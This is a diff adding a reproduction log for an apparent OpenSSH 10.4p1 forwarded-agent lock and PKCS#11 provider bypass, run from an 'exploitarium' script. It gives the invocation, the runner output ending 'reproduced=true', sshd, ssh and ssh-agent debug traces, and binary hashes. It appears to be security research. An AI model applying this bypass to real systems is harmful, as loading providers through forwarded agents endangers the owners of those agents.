@@ -1,0 +1,51 @@
+OpenSSH forwarded-agent lock provider replay
+Date: 2026-07-11
+Platform: Ubuntu 24.04.4 LTS x86-64 under WSL2
+
+Command:
+LOGIN_USER=owner \
+OPENSSH_PREFIX=/mnt/d/openssh-research-10.4p1/release-install \
+WORK_ROOT=/mnt/d/openssh-research-10.4p1/repository-replay \
+KEEP=1 \
+PORT=22991 \
+bash /mnt/d/exploitarium/openssh-agent-lock-provider-bypass/run.sh
+
+Runner output:
+lock_reply_type=6
+unlock_reply_type=6
+forwarded_socket_connected=true
+provider_reply_type=5
+target=OpenSSH_10.4p1, OpenSSL 3.0.13 30 Jan 2024
+session_bind_refused_while_locked=true
+forwarded_channel_opened=true
+provider_helper_started=true
+provider_initialized=true
+reproduced=true
+
+Stock sshd diagnostics:
+Accepted publickey for owner from 127.0.0.1 port 39752 ssh2: ED25519 SHA256:A3fHoNaYkfEbY0nT1tAP2oyveX9Sy9w9EHb43LE/RjQ
+Starting session: command for owner from 127.0.0.1 port 39752 id 0
+
+Stock ssh client diagnostics:
+debug2: client_request_agent: ssh_agent_bind_hostkey: agent refused operation
+debug1: channel 1: new agent-connection [authentication agent connection] (inactive timeout: 0)
+debug1: confirm agent-connect
+
+Stock ssh-agent diagnostics:
+debug1: agent locked
+debug1: process_message: socket 1 (fd=4) type 27
+debug1: process_message: socket 1 (fd=4) type 27
+debug1: agent unlocked
+debug1: process_message: socket 1 (fd=4) type 20
+debug1: process_add_smartcard_key: add /usr/lib/x86_64-linux-gnu/pkcs11/p11-kit-trust.so
+debug1: pkcs11_start_helper: starting /mnt/d/openssh-research-10.4p1/release-install/libexec/ssh-pkcs11-helper -vvv
+debug1: provider /usr/lib/x86_64-linux-gnu/pkcs11/p11-kit-trust.so: manufacturerID <PKCS#11 Kit> cryptokiVersion 2.40 libraryDescription <PKCS#11 Kit Trust Module> libraryVersion 0.25
+debug1: provider /usr/lib/x86_64-linux-gnu/pkcs11/p11-kit-trust.so slot 0: label <System Trust> manufacturerID <PKCS#11 Kit> model <p11-kit-trust> serial <1> flags 0x402
+
+Binary SHA-256:
+c50a8cd9b1016dccfd21cb9b2f98e0de5285c27a0db87a8a7ae464bcd40d2e0d  ssh-agent
+d41006f31c89164da9f3c778f085d56cc0077ff49b1aca361863386ed8a068e9  ssh
+7420fe8020cb3e4a895f3c7eecd3327bcca78f6b4c28b3c6a267b6cfb1cfcdb9  sshd
+
+Process cleanup:
+No replay ssh, sshd, ssh-agent, or helper process remained after the runner exited.
